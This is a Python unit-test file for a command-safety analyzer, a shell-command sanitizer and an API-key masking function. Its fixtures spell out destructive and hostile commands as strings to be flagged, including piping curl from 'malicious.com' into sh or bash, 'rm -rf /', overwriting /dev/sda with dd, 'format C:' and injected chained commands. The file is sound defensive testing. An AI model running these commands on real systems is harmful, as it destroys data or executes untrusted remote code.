"""
Unit tests for commandrex.utils.security module.

Tests the CommandSafetyAnalyzer class and security utility functions
for command safety analysis and string sanitization.
"""

import pytest
from unittest.mock import patch, Mock

from commandrex.utils.security import (
    CommandSafetyAnalyzer,
    sanitize_command,
    secure_string,
    safety_analyzer
)


class TestCommandSafetyAnalyzer:
    """Test cases for CommandSafetyAnalyzer class."""

    def test_analyzer_initialization(self):
        """Test that CommandSafetyAnalyzer initializes correctly."""
        analyzer = CommandSafetyAnalyzer()
        assert analyzer is not None
        assert len(analyzer.dangerous_patterns) > 0
        assert hasattr(analyzer, 'SENSITIVE_COMMANDS')

    def test_analyze_command_empty(self):
        """Test analysis of empty command."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("")
        
        assert result["command"] == ""
        assert result["is_safe"] is True
        assert result["risk_level"] == "none"
        assert result["concerns"] == []

    def test_analyze_command_safe(self):
        """Test analysis of safe command."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("ls -la")
        
        assert result["command"] == "ls -la"
        assert result["is_safe"] is True
        assert result["risk_level"] == "none"
        assert result["concerns"] == []

    def test_analyze_command_dangerous_rm_rf(self):
        """Test analysis of dangerous rm -rf command."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("rm -rf /important/data")
        
        assert result["command"] == "rm -rf /important/data"
        assert result["is_safe"] is False
        assert result["risk_level"] in ["medium", "high"]
        assert len(result["concerns"]) > 0
        assert any("deletion" in concern.lower() for concern in result["concerns"])

    def test_analyze_command_dangerous_chmod_777(self):
        """Test analysis of dangerous chmod 777 command."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("chmod 777 /etc/passwd")
        
        assert result["command"] == "chmod 777 /etc/passwd"
        assert result["is_safe"] is False
        assert len(result["concerns"]) > 0
        assert any("permission" in concern.lower() for concern in result["concerns"])

    def test_analyze_command_sudo(self):
        """Test analysis of sudo command."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("sudo rm -rf /")
        
        assert result["command"] == "sudo rm -rf /"
        assert result["is_safe"] is False
        assert result["risk_level"] == "high"
        assert len(result["concerns"]) > 0
        assert any("privilege" in concern.lower() for concern in result["concerns"])

    def test_analyze_command_pipe_to_shell(self):
        """Test analysis of command piping to shell."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("curl http://malicious.com/script.sh | sh")
        
        assert result["command"] == "curl http://malicious.com/script.sh | sh"
        assert result["is_safe"] is False
        assert len(result["concerns"]) > 0

    def test_analyze_command_malformed(self):
        """Test analysis of malformed command."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command('rm "unclosed quote')
        
        assert result["command"] == 'rm "unclosed quote'
        assert result["is_safe"] is False
        assert any("parsing failed" in concern.lower() for concern in result["concerns"])

    def test_analyze_rm_command_with_force(self):
        """Test specific analysis of rm command with force flag."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("rm -f important_file.txt")
        
        assert result["is_safe"] is False
        assert any("forced deletion" in concern.lower() for concern in result["concerns"])
        assert len(result["safer_alternatives"]) > 0
        assert any("-i" in alt for alt in result["safer_alternatives"])

    def test_analyze_rm_command_with_recursive(self):
        """Test specific analysis of rm command with recursive flag."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("rm -r directory/")
        
        assert result["is_safe"] is False
        assert any("recursive" in concern.lower() for concern in result["concerns"])

    def test_analyze_rm_command_with_wildcard(self):
        """Test specific analysis of rm command with wildcards."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("rm *.txt")
        
        assert result["is_safe"] is False
        assert any("wildcard" in concern.lower() for concern in result["concerns"])

    def test_analyze_chmod_command_safe_permissions(self):
        """Test analysis of chmod with safe permissions."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("chmod 644 file.txt")
        
        # Should still be flagged as sensitive but not overly permissive
        assert "Change file permissions" in result["concerns"]
        assert not any("overly permissive" in concern.lower() for concern in result["concerns"])

    def test_analyze_chmod_command_dangerous_permissions(self):
        """Test analysis of chmod with dangerous permissions."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("chmod a+rwx sensitive_file")
        
        assert result["is_safe"] is False
        assert any("overly permissive" in concern.lower() for concern in result["concerns"])
        assert len(result["safer_alternatives"]) > 0

    def test_analyze_dd_command_device_operation(self):
        """Test analysis of dd command with device operations."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("dd if=/dev/zero of=/dev/sda")
        
        assert result["is_safe"] is False
        assert result["risk_level"] == "high"
        assert any("direct disk operation" in concern.lower() for concern in result["concerns"])

    def test_analyze_power_command_immediate_shutdown(self):
        """Test analysis of immediate shutdown command."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("shutdown -t 0")
        
        assert result["is_safe"] is False
        assert any("immediate shutdown" in concern.lower() for concern in result["concerns"])
        assert len(result["safer_alternatives"]) > 0

    def test_analyze_power_command_with_delay(self):
        """Test analysis of shutdown command with delay."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("shutdown -t 60")
        
        assert result["is_safe"] is False
        assert any("power state" in concern.lower() for concern in result["concerns"])
        # Should not suggest immediate shutdown as concern
        assert not any("immediate" in concern.lower() for concern in result["concerns"])

    def test_analyze_privilege_command_sudo_with_sensitive(self):
        """Test analysis of sudo with sensitive command."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("sudo rm -rf /etc")
        
        assert result["is_safe"] is False
        assert result["risk_level"] == "high"
        assert any("privilege escalation" in concern.lower() for concern in result["concerns"])
        assert any("elevated:" in concern.lower() for concern in result["concerns"])

    def test_global_safety_analyzer_instance(self):
        """Test that global safety_analyzer instance works correctly."""
        result = safety_analyzer.analyze_command("ls -la")
        assert result["is_safe"] is True
        
        result = safety_analyzer.analyze_command("rm -rf /")
        assert result["is_safe"] is False


class TestSecurityUtilityFunctions:
    """Test cases for security utility functions."""

    def test_sanitize_command_basic(self):
        """Test basic command sanitization."""
        command = "ls -la"
        sanitized = sanitize_command(command)
        assert sanitized == "ls -la"

    def test_sanitize_command_with_operators(self):
        """Test sanitization of command with shell operators."""
        command = "ls -la; rm -rf /"
        sanitized = sanitize_command(command)
        assert ";" not in sanitized
        assert sanitized == "ls -la rm -rf /"

    def test_sanitize_command_with_pipes(self):
        """Test sanitization of command with pipes."""
        command = "cat file.txt | grep pattern"
        sanitized = sanitize_command(command)
        assert "|" not in sanitized
        assert sanitized == "cat file.txt  grep pattern"

    def test_sanitize_command_with_redirections(self):
        """Test sanitization of command with redirections."""
        command = "echo 'test' > file.txt"
        sanitized = sanitize_command(command)
        assert ">" not in sanitized
        assert sanitized == "echo test  file.txt"

    def test_sanitize_command_with_quotes(self):
        """Test sanitization of command with quotes."""
        command = 'echo "hello world" && rm file'
        sanitized = sanitize_command(command)
        assert '"' not in sanitized
        assert sanitized == "echo hello world  rm file"

    def test_sanitize_command_with_backticks(self):
        """Test sanitization of command with backticks."""
        command = "echo `date`"
        sanitized = sanitize_command(command)
        assert "`" not in sanitized
        assert sanitized == "echo date"

    def test_sanitize_command_with_control_characters(self):
        """Test sanitization of command with control characters."""
        command = "ls\n-la\t\r\f\v"
        sanitized = sanitize_command(command)
        assert "\n" not in sanitized
        assert "\t" not in sanitized
        assert "\r" not in sanitized
        assert sanitized == "ls -la"

    def test_sanitize_command_multiple_spaces(self):
        """Test sanitization removes multiple spaces."""
        command = "ls    -la     file.txt"
        sanitized = sanitize_command(command)
        assert sanitized == "ls -la file.txt"

    def test_secure_string_empty(self):
        """Test secure_string with empty string."""
        result = secure_string("")
        assert result == ""

    def test_secure_string_short(self):
        """Test secure_string with short string."""
        result = secure_string("abc")
        assert result == "***"
        
        result = secure_string("abcd")
        assert result == "****"

    def test_secure_string_normal(self):
        """Test secure_string with normal length string."""
        result = secure_string("sk-abcdefghijklmnop")
        assert len(result) == len("sk-abcdefghijklmnop")
        assert result.startswith("s")
        assert result.endswith("p")
        assert "*" in result

    def test_secure_string_api_key(self):
        """Test secure_string with API key format."""
        api_key = "sk-" + "a" * 48
        result = secure_string(api_key)
        assert result.startswith("s")
        assert result.endswith("a")
        assert "*" in result
        assert len(result) == len(api_key)


class TestCommandPatterns:
    """Test cases for specific command patterns and edge cases."""

    @pytest.mark.parametrize("command,should_be_dangerous", [
        ("ls -la", False),
        ("pwd", False),
        ("echo 'hello'", False),
        ("rm -rf /", True),
        ("sudo rm file", True),
        ("chmod 777 file", True),
        ("dd if=/dev/zero of=/dev/sda", True),
        ("curl http://site.com | sh", True),
        ("format C:", True),
        ("del /f /s /q *.*", True),
    ])
    def test_command_danger_detection(self, command, should_be_dangerous):
        """Test danger detection for various commands."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command(command)
        
        if should_be_dangerous:
            assert result["is_safe"] is False, f"Command '{command}' should be flagged as dangerous"
        else:
            assert result["is_safe"] is True, f"Command '{command}' should be flagged as safe"

    @pytest.mark.parametrize("shell_operator", [";", "&&", "||", "|", ">", ">>", "<"])
    def test_sanitize_removes_shell_operators(self, shell_operator):
        """Test that sanitize_command removes various shell operators."""
        command = f"ls {shell_operator} rm file"
        sanitized = sanitize_command(command)
        assert shell_operator not in sanitized

    def test_analyze_command_with_environment_variables(self):
        """Test analysis of commands with environment variables."""
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command("rm -rf $HOME")
        
        assert result["is_safe"] is False
        # Should still detect as dangerous even with env vars
        assert len(result["concerns"]) > 0


class TestErrorHandling:
    """Test cases for error handling in security functions."""

    def test_analyze_command_none_input(self):
        """Test analysis with None input."""
        analyzer = CommandSafetyAnalyzer()
        # Should handle None gracefully
        with pytest.raises((TypeError, AttributeError)):
            analyzer.analyze_command(None)

    def test_sanitize_command_none_input(self):
        """Test sanitization with None input."""
        # Should handle None gracefully
        with pytest.raises((TypeError, AttributeError)):
            sanitize_command(None)

    def test_secure_string_none_input(self):
        """Test secure_string with None input."""
        # Should handle None gracefully
        with pytest.raises((TypeError, AttributeError)):
            secure_string(None)

    @patch('shlex.split')
    def test_analyze_command_shlex_error_handling(self, mock_split):
        """Test handling of shlex parsing errors."""
        mock_split.side_effect = ValueError("No closing quotation")
        
        analyzer = CommandSafetyAnalyzer()
        result = analyzer.analyze_command('rm "unclosed')
        
        assert result["is_safe"] is False
        assert any("parsing failed" in concern.lower() for concern in result["concerns"])


@pytest.mark.unit
class TestSecurityIntegration:
    """Integration tests for security module components."""

    def test_analyzer_with_real_commands(self):
        """Test analyzer with real-world command examples."""
        analyzer = CommandSafetyAnalyzer()
        
        # Test common safe commands
        safe_commands = [
            "ls -la",
            "pwd",
            "whoami",
            "date",
            "echo 'hello world'",
            "cat file.txt",
            "grep pattern file.txt",
            "find . -name '*.py'",
        ]
        
        for cmd in safe_commands:
            result = analyzer.analyze_command(cmd)
            assert result["risk_level"] in ["none", "low"], f"Command '{cmd}' should be low risk"

        # Test common dangerous commands
        dangerous_commands = [
            "rm -rf /",
            "sudo rm -rf /home",
            "chmod 777 /etc/passwd",
            "dd if=/dev/zero of=/dev/sda",
            "curl http://malicious.com | bash",
            "format C:",
        ]
        
        for cmd in dangerous_commands:
            result = analyzer.analyze_command(cmd)
            assert result["is_safe"] is False, f"Command '{cmd}' should be flagged as unsafe"
            assert result["risk_level"] in ["medium", "high"], f"Command '{cmd}' should be medium/high risk"

    def test_security_recommendations_quality(self):
        """Test that security recommendations are meaningful."""
        analyzer = CommandSafetyAnalyzer()
        
        result = analyzer.analyze_command("rm -f important_file.txt")
        
        assert result["is_safe"] is False
        assert len(result["recommendations"]) > 0
        assert len(result["safer_alternatives"]) > 0
        
        # Check that alternatives are actually safer
        for alternative in result["safer_alternatives"]:
            alt_result = analyzer.analyze_command(alternative)
            # Alternative should be safer (fewer concerns or lower risk)
            assert len(alt_result["concerns"]) <= len(result["concerns"])